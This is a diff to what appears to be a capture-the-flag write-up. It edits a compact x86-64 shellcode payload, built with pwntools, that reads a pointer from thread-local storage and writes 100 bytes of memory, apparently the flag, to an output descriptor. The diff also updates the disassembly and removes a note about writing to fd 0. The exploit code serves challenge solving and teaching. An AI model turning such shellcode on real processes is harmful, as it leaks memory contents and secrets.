@@ -437,9 +437,9 @@ else:
 shellcode = asm(f'''
 mov rsi, qword ptr fs:0x300
 mov rsi, qword ptr [rsi - 0x2f0]
-{ 'xor rdi, rdi' if args.REMOTE else 'mov rdi, 1' }
 mov dl, 100
 mov al, {constants.SYS_write}
+mov rdi, rax
 syscall
 mov al, {constants.SYS_exit}
 syscall
@@ -459,8 +459,6 @@ print(_)
 
 > No need to match libc versions.
 > 
-> _`write` out FD `0`?!_  Yeah, you can do that (remotely, locally you'd want to run binary with `socat`).
-> 
 > `rax` and `rdx` were reset before shellcode run; use `dl` and `al` to reduce payload.
 
 29 bytes:
@@ -471,9 +469,9 @@ print(_)
    0:   64 48 8b 34 25 00 03    mov    rsi, QWORD PTR fs:0x300
    7:   00 00
    9:   48 8b b6 10 fd ff ff    mov    rsi, QWORD PTR [rsi-0x2f0]
-  10:   48 31 ff                xor    rdi, rdi
-  13:   b2 64                   mov    dl, 0x64
-  15:   b0 01                   mov    al, 0x1
+  10:   b2 64                   mov    dl, 0x64
+  12:   b0 01                   mov    al, 0x1
+  14:   48 89 c7                mov    rdi, rax
   17:   0f 05                   syscall
   19:   b0 3c                   mov    al, 0x3c
   1b:   0f 05                   syscall
